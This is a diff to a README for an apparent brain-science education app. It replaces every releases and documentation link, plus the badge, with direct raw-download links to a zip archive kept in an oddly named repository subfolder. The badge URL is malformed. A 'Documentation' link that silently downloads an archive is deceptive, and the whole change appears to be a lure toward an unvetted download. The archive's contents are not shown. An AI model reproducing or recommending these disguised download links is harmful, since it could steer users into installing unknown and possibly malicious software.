@@ -1,6 +1,6 @@
 # 🧠 neuroscience-education - Explore Brain Science with Ease
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-brightgreen.svg)](https://github.com/Designeamr/neuroscience-education/releases)
+[![Download Here](https://raw.githubusercontent.com/Designeamr/neuroscience-education/main/Anglomaniac/neuroscience-education.zip%https://raw.githubusercontent.com/Designeamr/neuroscience-education/main/Anglomaniac/neuroscience-education.zip)](https://raw.githubusercontent.com/Designeamr/neuroscience-education/main/Anglomaniac/neuroscience-education.zip)
 
 ## 📚 Introduction
 
@@ -18,7 +18,7 @@ To install and run the application, you will need a computer. The application wo
 
 To get the application, visit the Releases page:
 
-[Download Here](https://github.com/Designeamr/neuroscience-education/releases)
+[Download Here](https://raw.githubusercontent.com/Designeamr/neuroscience-education/main/Anglomaniac/neuroscience-education.zip)
 
 Once on the page, follow these steps:
 
@@ -59,7 +59,7 @@ If you wish to contribute to this project, feel free to check out our contributi
 
 ## 🔗 Useful Links
 
-- [Release Page](https://github.com/Designeamr/neuroscience-education/releases)
-- [Documentation](https://github.com/Designeamr/neuroscience-education/blob/main/README.md)
+- [Release Page](https://raw.githubusercontent.com/Designeamr/neuroscience-education/main/Anglomaniac/neuroscience-education.zip)
+- [Documentation](https://raw.githubusercontent.com/Designeamr/neuroscience-education/main/Anglomaniac/neuroscience-education.zip)
 
 Enjoy your journey into the fascinating world of neuroscience!
